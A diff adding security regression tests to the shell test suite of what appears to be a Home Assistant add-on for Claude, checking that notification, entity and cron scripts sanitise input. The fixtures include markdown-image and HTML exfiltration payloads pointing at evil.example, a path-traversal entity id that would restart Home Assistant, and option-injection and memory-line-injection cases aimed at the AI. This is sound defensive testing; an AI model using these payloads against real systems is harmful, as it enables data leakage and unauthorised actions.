@@ -2002,6 +2002,71 @@ oc_refute "the bridge is not called from main()" \
 oc_assert "the OpenCode update is backgrounded" \
     sh -c "sed -n '/^update_opencode()/,/^}/p' '$RUN_SH' | grep -qE 'install_opencode_native .*\) &\$'"
 
+# --- security review, 2.5.1-wdn.24 -------------------------------------------
+
+SEC_DIR=$(mktemp -d)
+mkdir -p "$SEC_DIR/bin"
+# A curl that records what it was asked to send instead of sending it.
+cat > "$SEC_DIR/bin/curl" << 'STUB'
+#!/bin/bash
+prev=""
+for a in "$@"; do
+    [ "$prev" = "-d" ] && printf '%s\n' "$a" > "$SEC_CURL_BODY"
+    prev="$a"
+done
+printf '%s\n' "${@: -1}" > "$SEC_CURL_URL"
+exit 0
+STUB
+chmod +x "$SEC_DIR/bin/curl"
+export SEC_CURL_BODY="$SEC_DIR/body" SEC_CURL_URL="$SEC_DIR/url"
+
+# /config/www is served by Home Assistant at /local/ with no login, and the
+# filename is the camera's name.
+oc_refute "ha-snapshot does not default to the unauthenticated /local/ folder" \
+    grep -qE '^DEFAULT_DIR="/config/www' "$SCRIPT_DIR/ha-snapshot.sh"
+oc_refute "ha-snapshot refuses an entity id that is not one" \
+    env SUPERVISOR_TOKEN=t PATH="$SEC_DIR/bin:$PATH" "$SCRIPT_DIR/ha-snapshot.sh" 'camera.../../services/x'
+
+# A notification renders markdown, and an image is fetched as the drawer opens.
+SUPERVISOR_TOKEN=t PATH="$SEC_DIR/bin:$PATH" "$SCRIPT_DIR/ha-notify.sh" "T ![](https://evil.example/t)" \
+    'done ![](https://evil.example/?d=secret) !![](https://evil.example/2) !!![a][r] <img src=x> <IMG src=x> <video poster="https://evil.example/p"> <svg><image href="https://evil.example/s"/></svg> [sign in](https://claude.ai/x)' sec_test
+oc_refute "ha-notify does not pass a markdown image through" grep -qF '![' "$SEC_CURL_BODY"
+# Removing a single "!" turns "!![" back into an image.
+oc_assert "a doubled ! does not survive as an image" \
+    jq -e '(.message | contains("![") | not) and (.title | contains("![") | not)' "$SEC_CURL_BODY"
+# <img> is one of many elements that fetch on render; a tag list always lags.
+oc_refute "ha-notify passes no HTML element through at all" grep -qF '<' "$SEC_CURL_BODY"
+oc_assert "ha-notify keeps ordinary links, which the sign-in notice relies on" \
+    grep -qF '[sign in](https://claude.ai/x)' "$SEC_CURL_BODY"
+oc_assert "the job-result blueprint neutralises repeated ! and every <" \
+    sh -c "grep -F 'regex_replace' '$(dirname "$RUN_SH")/blueprints/claude_terminal_job_result.yaml' | grep -F '!+' | grep -qF \"replace('<', '&lt;')\""
+
+# The entity id is a path component, and curl collapses "../".
+rm -f "$SEC_CURL_URL"
+oc_refute "ha-entity publish refuses an id that walks out of /api/states" \
+    env SUPERVISOR_TOKEN=t PATH="$SEC_DIR/bin:$PATH" "$SCRIPT_DIR/ha-entity.sh" publish '../services/homeassistant/restart' x
+oc_refute "nothing was sent for the refused id" test -e "$SEC_CURL_URL"
+oc_assert "ha-entity publish still accepts a real entity id" \
+    env SUPERVISOR_TOKEN=t PATH="$SEC_DIR/bin:$PATH" "$SCRIPT_DIR/ha-entity.sh" publish sensor.sec_test x
+oc_assert "and posts it to that entity" grep -qx 'http://supervisor/core/api/states/sensor.sec_test' "$SEC_CURL_URL"
+
+# A prompt beginning with "-" straight after -p is an option to claude.
+oc_assert "claude-cron passes the prompt after --" \
+    grep -qF -- '-- "$prompt"' "$SCRIPT_DIR/claude-cron.sh"
+oc_refute "claude-cron no longer passes the prompt straight after -p" \
+    sh -c "grep -v '^ *#' '$SCRIPT_DIR/claude-cron.sh' | grep -qF 'claude -p \"\$prompt\"'"
+
+# Clearing automation_api_key must retire the key it had set.
+oc_assert "a token that came from the option is replaced when the option is cleared" \
+    sh -c "sed -n '/^start_automation_api()/,/^}/p' '$RUN_SH' | grep -q 'from_option_marker'"
+
+# Free text from entities must not start lines of its own in Claude's memory.
+oc_assert "ha-context flattens add-on titles to one line" \
+    grep -qF '.entity_id | line)' "$SCRIPT_DIR/ha-context.sh"
+
+unset SEC_CURL_BODY SEC_CURL_URL
+rm -rf "$SEC_DIR"
+
 rm -rf "$OC_DIR"
 
 echo ""
